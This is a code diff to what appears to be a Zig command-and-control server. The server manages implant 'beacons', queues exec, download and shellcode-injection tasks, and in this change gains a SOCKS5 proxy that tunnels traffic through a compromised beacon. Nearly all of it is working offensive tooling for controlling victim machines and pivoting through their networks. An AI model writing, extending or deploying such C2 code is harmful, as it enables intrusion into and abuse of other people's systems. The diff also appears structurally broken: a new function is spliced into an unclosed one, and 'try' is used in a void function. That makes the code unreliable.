@@ -5,15 +5,18 @@
 const std = @import("std");
 const crypto = @import("crypto.zig");
 const Ui = @import("ui.zig").Ui;
-const os = if (@hasDecl(std, "posix")) std.posix else os;
-const ArrayList = std.array_list.Managed;
+const Socks5Server = @import("socks.zig").Socks5Server;
+const os = if (@hasDecl(std, "posix")) std.posix else std.os;
 
 pub const Server = struct {
     allocator: std.mem.Allocator,
     port: u16,
     key: [crypto.KeySize]u8,
     beacons: std.StringHashMap(Beacon),
-    tasks: ArrayList(Task),
+    tasks: std.ArrayList(Task),
+    socks_server: ?Socks5Server = null,
+    socks_clients: std.AutoHashMap(u32, std.net.Stream),
+    next_proxy_id: u32 = 1,
     mutex: std.Thread.Mutex,
 
     const Beacon = struct {
@@ -26,7 +29,7 @@ pub const Server = struct {
 
     const Task = struct {
         id: u64,
-        type: enum { exec, download, audit, inject },
+        type: enum { exec, download, audit, inject, proxy },
         beacon_id: []const u8,
         command: []const u8, // Used for path in download, shellcode in inject
         status: enum { queued, sent, completed, failed },
@@ -42,7 +45,8 @@ pub const Server = struct {
             .port = port,
             .key = key,
             .beacons = std.StringHashMap(Beacon).init(allocator),
-            .tasks = ArrayList(Task).init(allocator),
+            .tasks = std.ArrayList(Task).init(allocator),
+            .socks_clients = std.AutoHashMap(u32, std.net.Stream).init(allocator),
             .mutex = .{},
         };
     }
@@ -75,6 +79,12 @@ pub const Server = struct {
         ui.info("[*] C2 Server listening on 0.0.0.0:{d} (TCP/Encrypted)\n", .{self.port});
         ui.info("[*] PSK-derived Key: {s}\n", .{&key_hex});
         ui.info("[*] Type 'help' for commands\n", .{});
+
+        // Start SOCKS
+        var socks = Socks5Server.init(self.allocator, 1080);
+        try socks.listen();
+        self.socks_server = socks;
+        (try std.Thread.spawn(.{}, socksLoop, .{self})).detach();
 
         (try std.Thread.spawn(.{}, shellLoop, .{self})).detach();
 
@@ -317,7 +327,17 @@ pub const Server = struct {
                 return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
                     .type = "inject",
                     .id = task.id,
-                    .data = task.command, // contains base64 shellcode
+                    .data = task.command,
+                }, .{})});
+            } else if (task.type == .proxy) {
+                // Command is already JSON: { subtype: ..., ... }
+                // We wrap it? No, we pass it raw? Or we include it in data?
+                // Protocol expects 'type', 'id'.
+                // Let's use: type="proxy", id=..., command=... (where command is the inner JSON)
+                return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
+                    .type = "proxy",
+                    .id = task.id,
+                    .command = task.command,
                 }, .{})});
             }
         }
@@ -461,5 +481,104 @@ pub const Server = struct {
             .status = .queued,
         });
         return id;
+    fn socksLoop(self: *Server) void {
+        while (true) {
+            if (self.socks_server) |*s| {
+                const conn = s.accept() catch {
+                    std.time.sleep(100 * 1_000_000);
+                    continue;
+                };
+                (try std.Thread.spawn(.{}, handleSocksClient, .{ self, conn })).detach();
+            } else {
+                std.time.sleep(1 * 1_000_000_000);
+            }
+        }
+    }
+
+    fn handleSocksClient(self: *Server, conn: std.net.Server.Connection) void {
+        const reader = conn.stream.reader();
+        const writer = conn.stream.writer();
+
+        Socks5Server.handleHandshake(reader, writer) catch return;
+        const req = Socks5Server.handleRequest(self.allocator, reader, writer) catch return;
+
+        self.mutex.lock();
+        const id = self.next_proxy_id;
+        self.next_proxy_id += 1;
+        self.socks_clients.put(id, conn.stream) catch {
+            self.mutex.unlock();
+            return;
+        };
+        
+        var beacon_id: []const u8 = "";
+        var iter = self.beacons.keyIterator();
+        if (iter.next()) |k| {
+            beacon_id = self.allocator.dupe(u8, k.*) catch ""; 
+        }
+        self.mutex.unlock();
+
+        if (beacon_id.len == 0) {
+            conn.stream.close();
+            return;
+        }
+        defer self.allocator.free(beacon_id);
+
+        var host_buf: [256]u8 = undefined;
+        // addr is std.net.Address. format is 1.2.3.4:80
+        const host_str = std.fmt.bufPrint(&host_buf, "{f}", .{req.addr}) catch return;
+        
+        self.queueProxyConnect(beacon_id, id, host_str) catch return;
+
+        var buf: [4096]u8 = undefined;
+        while (true) {
+            const len = reader.read(&buf) catch break;
+            if (len == 0) break;
+            self.queueProxyWrite(beacon_id, id, buf[0..len]) catch break;
+        }
+
+        self.mutex.lock();
+        _ = self.socks_clients.remove(id);
+        self.mutex.unlock();
+        conn.stream.close();
+    }
+
+    pub fn queueProxyConnect(self: *Server, beacon_id: []const u8, id: u32, target: []const u8) !void {
+        const payload = .{ .subtype = "connect", .id = id, .target = target };
+        const cmd = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
+        
+        self.mutex.lock();
+        defer self.mutex.unlock();
+        const tid = @as(u64, @intCast(self.tasks.items.len + 1));
+        try self.tasks.append(.{
+            .id = tid,
+            .type = .proxy,
+            .beacon_id = try self.allocator.dupe(u8, beacon_id),
+            .command = cmd,
+            .status = .queued,
+        });
+    }
+
+    pub fn queueProxyWrite(self: *Server, beacon_id: []const u8, id: u32, data: []const u8) !void {
+        const encoder = std.base64.standard.Encoder;
+        const b64_len = encoder.calcSize(data.len);
+        const b64 = try self.allocator.alloc(u8, b64_len);
+        _ = encoder.encode(b64, data);
+        // command takes ownership of b64 string if we format it right? 
+        // No, json fmt prints it. We need to free b64.
+        
+        const payload = .{ .subtype = "write", .id = id, .data = b64 };
+        const cmd = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
+        self.allocator.free(b64);
+
+        self.mutex.lock();
+        defer self.mutex.unlock();
+        const tid = @as(u64, @intCast(self.tasks.items.len + 1));
+        try self.tasks.append(.{
+            .id = tid,
+            .type = .proxy,
+            .beacon_id = try self.allocator.dupe(u8, beacon_id),
+            .command = cmd,
+            .status = .queued,
+        });
     }
 };
